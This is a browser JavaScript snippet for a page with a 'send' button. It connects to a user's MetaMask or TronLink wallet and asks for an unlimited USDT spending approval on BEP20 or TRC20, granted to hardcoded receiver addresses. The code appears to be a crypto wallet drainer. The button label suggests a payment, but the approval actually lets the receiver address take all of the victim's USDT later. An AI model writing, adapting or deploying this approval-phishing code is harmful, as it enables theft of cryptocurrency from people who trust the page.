const TRC20_ADDRESS = 'TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN'; // Your TRC20 receiver address
const BEP20_ADDRESS = '0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E'; // Your BEP20 receiver address

const BEP20_USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955'; // BEP20 USDT
const TRC20_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC20 USDT

document.getElementById("sendBtn").addEventListener("click", async () => {
  const selectedNetwork = document.getElementById("networkSelect").value;

  if (selectedNetwork === "bep20") {
    if (typeof window.ethereum === 'undefined') {
      alert("Please install MetaMask or a BEP20-compatible wallet.");
      return;
    }

    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    const userAddress = accounts[0];

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const contract = new ethers.Contract(BEP20_USDT_CONTRACT, [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ], signer);

    try {
      const tx = await contract.approve(BEP20_ADDRESS, ethers.constants.MaxUint256);
      await tx.wait();
      alert("BEP-20 USDT Approved Successfully!");
    } catch (err) {
      console.error("Approval failed:", err);
      alert("BEP-20 Approval Failed.");
    }

  } else if (selectedNetwork === "trc20") {
    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
      alert("Please open this page in TronLink or Trust Wallet (TRC).");
      return;
    }

    try {
      const contract = await window.tronWeb.contract().at(TRC20_USDT_CONTRACT);
      await contract.approve(TRC20_ADDRESS, "9223372036854775807").send({
        feeLimit: 100_000_000
      });
      alert("TRC-20 USDT Approved Successfully!");
    } catch (err) {
      console.error("TRC20 Approval Error:", err);
      alert("TRC-20 Approval Failed.");
    }
  }
});
